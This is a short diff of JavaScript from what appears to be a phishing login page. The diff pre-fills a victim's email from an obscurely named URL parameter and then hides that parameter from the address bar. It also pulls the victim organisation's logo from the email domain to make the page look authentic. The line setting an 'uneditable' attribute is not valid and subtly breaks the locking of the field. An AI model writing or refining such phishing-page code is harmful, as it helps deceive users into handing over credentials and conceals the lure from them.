@@ -17,13 +17,20 @@ const maxAttempts = 3;
 
 document.body.classList.add('blur-active');
 
-if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
-  alert("Invalid or missing email in the URL hash.");
-} else {
-  emailInput.value = rawHash;
-  emailInput.setAttribute("readonly", true);
+// Get email from URL  ?u=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("br29ns97");
 
-  const domain = rawHash.split('@')[1];
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  emailInput.value = rawEmail;
+  emailInput.setAttribute("uneditable", true);
+
+  const domain = rawEmail.split('@')[1];
+ 
+ // HIDE parameter
+  history.replaceState({}, document.title, window.location.pathname);
 
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
